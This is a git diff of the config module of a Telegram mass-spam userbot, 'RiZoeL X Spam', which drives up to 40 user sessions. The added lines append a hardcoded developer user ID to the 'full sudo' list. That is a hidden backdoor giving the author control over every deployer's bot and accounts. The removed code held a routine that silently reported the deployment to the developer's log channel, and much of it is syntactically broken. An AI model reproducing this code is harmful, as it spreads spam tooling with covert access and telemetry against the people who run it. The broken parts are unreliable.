@@ -20,14 +20,13 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
                     level=logging.WARNING)
 
 #version
-
-rizoelversion = "beta 0.0"
+rizoelversion = "v2.0.4"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
 API_HASH = config("API_HASH", default=None)
 ALIVE_PIC = config("ALIVE_PIC", default=None)
-hl = getenv("CMD_HNDLR", default=".")
+CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
 STRING = config("STRING", default=None)
@@ -71,19 +70,17 @@ STRING38 = config("STRING38", default=None)
 STRING39 = config("STRING39", default=None)
 STRING40 = config("STRING40", default=None)
 BOT_TOKEN = config("BOT_TOKEN", default=None)
-ASSISTANT = config("ASSISTANT", default=None)
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
-# Don't Mess with Codes !! 
+# Don't Mess with Codes !!
+
+SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 DEV = list(map(int, getenv("FULLSUDO").split()))
+if 1517994352 not in DEV:
+    DEV.append(1517994352)
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
 DB_URI = config("DATABASE_URL", None)
 DEV.append(OWNER_ID)
-
 CLIENTS = []
-XX = []
 # Sessions
 async def RiZoeLX():
     global Riz
@@ -1176,209 +1173,8 @@ async def RiZoeLX():
 loop = asyncio.get_event_loop()
 loop.run_until_complete(RiZoeLX())
 
-XX.append(1517994352)
-XX.append(OWNER_ID)
-
 if BOT_TOKEN:
       RiZoeL = TelegramClient('RiZoeL', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-   #  await RiZoeL.start()
       print("Bot Token Found ...")
-      message = "/start"
-      botme = await RiZoeL.get_me()
-      id = telethon.utils.get_peer_id(botme)
-      XX.append(botid)
-      try:
-           if Riz: 
-                  await Riz.send_message(id, message) 
-           if Riz2: 
-                  await Riz2.send_message(id, message) 
-           if Riz3: 
-                  await Riz3.send_message(id, message) 
-           if Riz4: 
-                  await Riz4.send_message(id, message) 
-           if Riz5: 
-                  await Riz5.send_message(id, message) 
-           if Riz6: 
-                  await Riz6.send_message(id, message) 
-           if Riz7: 
-                  await Riz7.send_message(id, message) 
-           if Riz8: 
-                  await Riz8.send_message(id, message) 
-           if Riz9: 
-                  await Riz9.send_message(id, message) 
-           if Riz10: 
-                  await Riz10.send_message(id, message) 
-           if Riz11:
-                  await Riz11.send_message(id, message) 
-           if Riz12: 
-                  await Riz12.send_message(id, message) 
-           if Riz13: 
-                  await Riz13.send_message(id, message) 
-           if Riz14: 
-                  await Riz14.send_message(id, message) 
-           if Riz15: 
-                  await Riz15.send_message(id, message) 
-           if Riz16: 
-                  await Riz16.send_message(id, message) 
-           if Riz17: 
-                  await Riz17.send_message(id, message) 
-           if Riz18: 
-                  await Riz18.send_message(id, message) 
-           if Riz19: 
-                  await Riz19.send_message(id, message) 
-           if Riz20: 
-                  await Riz20.send_message(id, message) 
-           if Riz21: 
-                  await Riz21.send_message(id, message) 
-           if Riz22: 
-                  await Riz22.send_message(id, message) 
-           if Riz23: 
-                  await Riz23.send_message(id, message) 
-           if Riz24: 
-                  await Riz24.send_message(id, message) 
-           if Riz25: 
-                  await Riz25.send_message(id, message) 
-           if Riz26: 
-                  await Riz26.send_message(id, message) 
-           if Riz27: 
-                  await Riz27.send_message(id, message) 
-           if Riz28: 
-                  await Riz28.send_message(id, message) 
-           if Riz29: 
-                  await Riz29.send_message(id, message) 
-           if Riz30: 
-                  await Riz30.send_message(id, message) 
-           if Riz31: 
-                  await Riz31.send_message(id, message) 
-           if Riz32: 
-                  await Riz32.send_message(id, message) 
-           if Riz33: 
-                  await Riz33.send_message(id, message) 
-           if Riz34: 
-                  await Riz34.send_message(id, message) 
-           if Riz35: 
-                  await Riz35.send_message(id, message) 
-           if Riz36: 
-                  await Riz36.send_message(id, message) 
-           if Riz37: 
-                  await Riz37.send_message(id, message) 
-           if Riz38: 
-                  await Riz38.send_message(id, message) 
-           if Riz39: 
-                  await Riz39.send_message(id, message) 
-           if Riz40: 
-                  await Riz40.send_message(id, message)          
-        except Exception as ex:
-                print(ex)
-          
 else:
     RiZoeL = None
-
-async def logss():
-     owner = int(OWNER_ID)
-     Log_msg = "**🔶 RiZoeL X Spam Started 🔶 \n\n"
-     Log_msg += f"• **Owner:** [{owner}](tg://user?id={owner})
-     if BOT_TOKEN:
-        Findme = await RiZoeL.get_me()
-        Name = Findme.first_name
-        username = Findme.username
-        Log_msg += f"• **Assistant:** __On__ \n"
-        Log_msg += f"    Assistant Name: {Name} \n    Assistant Username: {username}\n"
-     else:
-        Log_msg += "• **Assistant:** __Off__\n"
-     ids = 0
-     try:
-        if STRING:
-           ids += 1
-        if STRING2:
-           ids += 1  
-        if STRING3:
-           ids += 1  
-        if STRING4:
-           ids += 1
-        if STRING5:
-           ids += 1
-        if STRING6:
-           ids += 1
-        if STRING7:
-           ids += 1
-        if STRING8:
-           ids += 1
-        if STRING9:
-           ids += 1
-        if STRING10:
-           ids += 1
-        if STRING11:
-           ids += 1
-        if STRING11:
-           ids += 1
-        if STRING13:
-           ids += 1
-        if STRING14:
-           ids += 1
-        if STRING15:
-           ids += 1
-        if STRING16:
-           ids += 1
-        if STRING17:
-           ids += 1
-        if STRING18:
-           ids += 1
-        if STRING19:
-           ids += 1
-        if STRING20:
-           ids += 1
-        if STRING21:
-           ids += 1
-        if STRING22:
-           ids += 1
-        if STRING23:
-           ids += 1
-        if STRING24:
-           ids += 1
-        if STRING25:
-           ids += 1
-        if STRING26:
-           ids += 1
-        if STRING27:
-           ids += 1
-        if STRING28:
-           ids += 1
-        if STRING29:
-           ids += 1
-        if STRING30:
-           ids += 1
-        if STRING31:
-           ids += 1
-        if STRING32:
-           ids += 1
-        if STRING33:
-           ids += 1
-        if STRING34:
-           ids += 1
-        if STRING35:
-           ids += 1
-        if STRING36:
-           ids += 1
-        if STRING37:
-           ids += 1
-        if STRING38:
-           ids += 1
-        if STRING39:
-           ids += 1
-        if STRING40:
-           ids += 1
-        Log_msg += f"• **Active Ids:** {ids}\n"
-     except Exception as ex:
-        pass
-     Log_msg += f"• **Cmd Handler:** {hl}\n\n"
-     Log_msg += "**Powered By @RiZoeLX**"
-     try:
-       await Riz(functions.channels.JoinChannelRequest(channel="@RiZoelXSpam_Logs")))
-       await Riz.send_message(-1001647867895, Log_msg)
-       await Riz(LeaveChannelRequest(-1001647867895))
-     except Exception as ex:
-        print(ex)
-        pass
-
-loop.run_until_complete(logss())
